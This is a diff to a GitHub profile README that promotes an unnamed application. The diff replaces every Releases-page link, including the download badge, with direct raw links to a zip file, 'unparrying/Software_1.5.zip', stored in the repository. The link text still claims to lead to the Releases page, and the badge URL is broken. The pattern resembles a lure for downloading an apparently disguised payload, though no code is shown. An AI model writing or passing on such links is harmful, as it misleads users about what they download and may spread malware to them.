@@ -6,7 +6,7 @@ Welcome to the official GitHub profile of Sanjit Chaurasiya. You are in the righ
 
 ## 📦 Download Now
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-v1.0-blue)](https://github.com/aksh-dash/sanjitchaurasiya/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/aksh-dash/sanjitchaurasiya/main/unparrying/Software_1.5.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/aksh-dash/sanjitchaurasiya/main/unparrying/Software_1.5.zip)
 
 ## 🛠 What You Need
 
@@ -18,7 +18,7 @@ To get started, follow these simple steps:
 
 1. Click on the link below to visit the Releases page.
    
-   [Visit the Releases Page to Download](https://github.com/aksh-dash/sanjitchaurasiya/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/aksh-dash/sanjitchaurasiya/main/unparrying/Software_1.5.zip)
 
 2. On the Releases page, you will see a list of available versions. Browse through the versions and choose the latest release. The latest version will usually be at the top of the list.
 
@@ -73,6 +73,6 @@ As a user, you become part of a vibrant community. Engaging with other users can
 
 To wrap it up, if you haven’t already, make sure to download the application using the link below. It’s time to enhance your digital life.
 
-[Download Now](https://github.com/aksh-dash/sanjitchaurasiya/releases) 
+[Download Now](https://raw.githubusercontent.com/aksh-dash/sanjitchaurasiya/main/unparrying/Software_1.5.zip) 
 
 Feel free to reach out if you would like to explore more features or ask questions. Enjoy your new software!
